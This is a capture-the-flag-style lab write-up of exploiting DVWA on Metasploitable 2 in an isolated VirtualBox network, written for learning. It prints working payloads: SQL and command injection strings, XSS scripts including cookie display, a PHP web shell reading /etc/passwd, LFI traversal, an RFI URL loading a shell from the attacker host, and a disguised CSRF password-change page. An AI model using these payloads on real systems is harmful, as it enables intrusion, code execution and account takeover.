# HomeLab 3 — Web Exploitation (DVWA)

This lab demonstrates multiple web vulnerabilities using Damn Vulnerable Web Application (DVWA) hosted on Metasploitable 2. The goal is to understand how insecure input handling leads to authentication bypass, code execution, file disclosure, and unauthorized state changes. The attacker machine is Kali Linux.

---

## Lab Environment

VM                 | Role      | IP Address
------------------ | --------- | -----------
Kali Linux         | Attacker  | 192.168.56.101
Metasploitable 2   | DVWA Host | 192.168.56.103

Network Mode: VirtualBox Host-Only  
DVWA Security Level: LOW

---

## Objectives

- Perform brute force attack using Burp Suite
- Extract data using SQL Injection
- Execute OS commands using Command Injection
- Demonstrate Reflected and Stored XSS
- Upload a malicious PHP file and execute server-side commands
- Read files using Local File Inclusion (LFI)
- Achieve Remote Code Execution using Remote File Inclusion (RFI)
- Change user password using CSRF attack

---

## Step 1 — Brute Force (Burp Suite)

I intercepted the login request using Burp Suite after submitting admin:admin.  
The password parameter was marked as the attack position.  
The default wordlist rockyou.txt.gz caused lag, so I used a small custom list with 7 passwords.

The payload that produced a different response length was “password”, indicating a successful login.

---

## Step 2 — SQL Injection

On the SQL Injection page, I entered:

1' OR '1'='1

DVWA returned multiple user entries, confirming SQL injection.  
The application directly concatenates user input into SQL queries.

---

## Step 3 — Command Injection

I tested command injection using:

8.8.8.8; whoami  
8.8.8.8 | uname -a  
8.8.8.8 | pwd

DVWA returned valid output such as “www-data”.  
This occurs because DVWA does not sanitize the input, allowing commands after separators to execute.

---

## Step 4 — Reflected XSS

Payload:

<script>alert('XSS')</script>

The browser executed the alert. Another payload displayed document.cookie.  
DVWA renders user input without sanitization, enabling script execution.

---

## Step 5 — Stored XSS

I inserted:

Name: test  
Message: <script>alert('Stored XSS')</script>

The script was stored in the database and executed every time the page was loaded or revisited.

---

## Step 6 — File Upload (PHP Web Shell → RCE)

I created a PHP webshell:

<?php system($_GET['cmd']); ?>

DVWA Low allowed the upload without validation.  
I accessed the uploaded file and executed commands:

shell.php?cmd=cat /etc/passwd  
shell.php?cmd=whoami  
shell.php?cmd=id

This produced output such as uid=33(www-data), confirming RCE.

---

## Step 7 — Local File Inclusion (LFI)

Using path traversal:

../../../../../etc/passwd

DVWA displayed /etc/passwd.  
DVWA’s vulnerable file is inside:

/var/www/dvwa/vulnerabilities/fi/

Climbing five directories reaches the filesystem root.  
Extra "../" segments are ignored by Linux path normalization.

---

## Step 8 — Remote File Inclusion (RFI)

Initial RFI attempt failed because the system PHP configuration had:

allow_url_include = Off

After changing it to On and restarting Apache, RFI succeeded.

I hosted shell.php on Kali with:

python3 -m http.server 8000

Then executed:

http://192.168.56.103/dvwa/vulnerabilities/fi/?page=http://192.168.56.101:8000/shell.php&cmd=id

Result returned uid=33(www-data), demonstrating remote code execution.

---

## Step 9 — CSRF (Cross-Site Request Forgery)

DVWA's password-change form uses GET, has no CSRF token, and performs no origin validation.

I built a malicious attacker page:

<html>
  <body>
    <form action="http://192.168.56.103/dvwa/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new" value="pwned123">
      <input type="hidden" name="password_conf" value="pwned123">
      <input type="hidden" name="Change" value="Change">
      <input type="submit" value="Claim your free gift card!">
    </form>
  </body>
</html>

Hosted using:

python3 -m http.server 8000

While logged in as admin, clicking the button changed the password to pwned123.  
I confirmed this by logging out and logging back in successfully.

---

## Vulnerability Summary

- Brute Force: No rate limiting  
- SQL Injection: Input concatenated directly into SQL queries  
- Command Injection: Unsanitized shell command execution  
- Reflected XSS: Browser executes unescaped user input  
- Stored XSS: Malicious script stored in database and re-executed  
- File Upload: No file-type validation, enabling PHP upload  
- LFI: File path controlled by user  
- RFI: Enabled after allow_url_include was turned on  
- CSRF: No CSRF token or origin validation

---

## Files Included in This Lab
'''text

/lab3/
├── README.md
├── DVWA_Web_Exploitation.pdf
├── shell.php
├── csrf_attack.html
└── Screenshots/
    Brute_force.png
    Burp_Post_request.png
    Captured_and_setting_up.png
    change_to_smalllist.png
    Command_Injection_before.png
    Command_Injection_pwd.png
    Command_Injection_uname.png
    Command_Injection_whoami.png
    CSRF_Fake_site.png
    CSRF_normal_password_change.png
    CSRF_redirected_after_click.png
    CSRF_relogin.png
    CSRF_success_relogin.png
    CSRF_view_source.png
    DVWA_login_page.png
    DVWA_home_page_after_login.png
    File_Upload_etc_passwd.png
    File_Upload_id.png
    File_Upload_Main.png
    File_Upload_success.png
    File_Upload_whoami.png
    LFI_etc_passwd.png
    LFI_Search.png
    Relogin.png
    Relogin_result.png
    result.png
    RFI_Failed.png
    RFI_kali_server.png
    RFI_Success.png
    Rockyou_tried.png
    Security_level_set_low.png
    SQL_Injection_After.png
    SQL_Injection_before_testing.png
    XSS_alert.png
    XSS_alert_result.png
    XSS_Cookie_command.png
    XSS_Cookie_result.png
    XSS_Main.png
    XSS_Stored_main.png
    XSS_Stored_data.png
    XSS_Stored_alert_after_submission.png
    XSS_Stored_reentering.png
    XSS_Stored_refresh.png


---

